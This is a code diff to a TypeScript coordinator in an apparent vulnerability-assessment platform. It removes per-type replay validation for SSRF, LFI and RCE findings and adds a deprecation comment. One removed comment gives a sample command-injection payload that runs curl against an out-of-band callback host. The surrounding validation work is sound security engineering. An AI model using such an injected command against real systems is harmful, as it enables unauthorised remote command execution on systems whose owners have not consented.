@@ -582,124 +582,17 @@ export const startDecepticonSession = async (
       await deps.queueAdapter.publish(validateEnvelope);
     }
 
-    // Sprint 18 — publish a `validator.ssrf.replay` envelope for SSRF candidates.
-    // Token format: <candidateFindingId>.<tenantId>.<random8hex>.
-    if (candidate.type === 'ssrf') {
-      const randomHex8 =
-        deps.randomHex8?.() ??
-        (await import('node:crypto').then((m) => m.randomBytes(4).toString('hex')));
-      const ssrfToken = `${candidateFindingId}.${input.tenantId}.${randomHex8}`;
-      const ssrfEnvelope: JobEnvelope = {
-        jobId: randomUUID(),
-        tenantId: input.tenantId,
-        projectId: input.projectId ?? null,
-        assessmentId: input.assessmentId,
-        kind: 'validator.ssrf.replay',
-        idempotencyKey: `${input.parentEnvelope.idempotencyKey}:ssrf:${candidateFindingId}`,
-        createdAt: clockIso(),
-        attempt: 0,
-        maxAttempts: 3,
-        traceId: input.traceId,
-        payload: {
-          tenantId: input.tenantId,
-          projectId: input.projectId ?? null,
-          assessmentId: input.assessmentId,
-          candidateFindingId,
-          candidateType: 'ssrf',
-          replayUrl: candidate.affectedUrl.includes('?')
-            ? `${candidate.affectedUrl}&_cs_token=${ssrfToken}`
-            : `${candidate.affectedUrl}?_cs_token=${ssrfToken}`,
-          token: ssrfToken,
-          traceId: input.traceId,
-        },
-      };
-      await deps.queueAdapter.publish(ssrfEnvelope);
-    }
-
-    // Sprint 19 — publish a `validator.lfi.replay` envelope for LFI candidates.
-    // No OOB token — LFI validator fetches affectedUrl from DB and matches response body.
-    if (candidate.type === 'lfi') {
-      const lfiEnvelope: JobEnvelope = {
-        jobId: randomUUID(),
-        tenantId: input.tenantId,
-        projectId: input.projectId ?? null,
-        assessmentId: input.assessmentId,
-        kind: 'validator.lfi.replay',
-        idempotencyKey: `${input.parentEnvelope.idempotencyKey}:lfi:${candidateFindingId}`,
-        createdAt: clockIso(),
-        attempt: 0,
-        maxAttempts: 3,
-        traceId: input.traceId,
-        payload: {
-          tenantId: input.tenantId,
-          projectId: input.projectId ?? null,
-          assessmentId: input.assessmentId,
-          candidateFindingId,
-          candidateType: 'lfi',
-          traceId: input.traceId,
-        },
-      };
-      await deps.queueAdapter.publish(lfiEnvelope);
-    }
-
-    // Sprint 20 — publish a `validator.rce.replay` envelope for RCE candidates.
-    // Token format: <candidateFindingId>.<tenantId>.<random8hex> (mirrors SSRF).
-    // OOB token embedded via <TOKEN> placeholder substitution (codex HIGH/P1 fix):
-    //   Decepticon-generated candidates must embed <TOKEN> inside the shell payload,
-    //   e.g. ?cmd=$(curl http://oob.lab/<TOKEN>/cb). Coordinator replaces <TOKEN> with
-    //   the generated rceToken so the executed shell command carries it to the OOB receiver.
-    //   Sibling _cs_token= appending does NOT work for RCE — the shell reads the literal
-    //   command string and never sees surrounding query params.
-    if (candidate.type === 'rce') {
-      if (!candidate.affectedUrl.includes('<TOKEN>')) {
-        await emitSignedAudit(deps.db, {
-            tenantId: input.tenantId,
-            action: 'validator.rce.replay_denied',
-            outcome: 'denied',
-            actorType: 'service',
-            actorId: COORDINATOR_ACTOR_ID,
-            actorName: 'coordinator',
-            resourceType: 'candidate_finding',
-            resourceId: candidateFindingId,
-            ...(input.projectId ? { projectId: input.projectId } : {}),
-            assessmentId: input.assessmentId,
-            ip: null,
-            userAgent: null,
-            traceId: input.traceId,
-            metadata: { reason: 'token_placeholder_missing', affectedUrl: candidate.affectedUrl },
-          },
-        );
-        continue;
-      }
-      const randomHex8 =
-        deps.randomHex8?.() ??
-        (await import('node:crypto').then((m) => m.randomBytes(4).toString('hex')));
-      const rceToken = `${candidateFindingId}.${input.tenantId}.${randomHex8}`;
-      const rceReplayUrl = candidate.affectedUrl.replaceAll('<TOKEN>', rceToken);
-      const rceEnvelope: JobEnvelope = {
-        jobId: randomUUID(),
-        tenantId: input.tenantId,
-        projectId: input.projectId ?? null,
-        assessmentId: input.assessmentId,
-        kind: 'validator.rce.replay',
-        idempotencyKey: `${input.parentEnvelope.idempotencyKey}:rce:${candidateFindingId}`,
-        createdAt: clockIso(),
-        attempt: 0,
-        maxAttempts: 3,
-        traceId: input.traceId,
-        payload: {
-          tenantId: input.tenantId,
-          projectId: input.projectId ?? null,
-          assessmentId: input.assessmentId,
-          candidateFindingId,
-          candidateType: 'rce',
-          affectedUrl: rceReplayUrl,
-          token: rceToken,
-          traceId: input.traceId,
-        },
-      };
-      await deps.queueAdapter.publish(rceEnvelope);
-    }
+    // 2026-05-12 — DEPRECATED — per-type validator dispatch removed.
+    // Decepticon's `verifier` agent handles validation universally with ZFP +
+    // CVSS + PoC for ALL vulnerability classes (not just SSRF/LFI/RCE/SQLi).
+    // See project_tensol_architectural_audit_2026-05-12.md for the audit
+    // that surfaced this duplication. validator-worker package retained for
+    // historical IT-test coverage but no longer invoked from this hot path —
+    // workspace-extractor (step 8.5) is the single source of finding
+    // ingestion now, and Decepticon's `assistant_id=verifier` flow (planned
+    // Phase 3 of the cleanup) will handle ZFP validation upstream of our
+    // extractor, eliminating the candidate→confirmed promotion logic
+    // entirely from Tensol-side code.
 
     await emitSignedAudit(deps.db, {
         tenantId: input.tenantId,
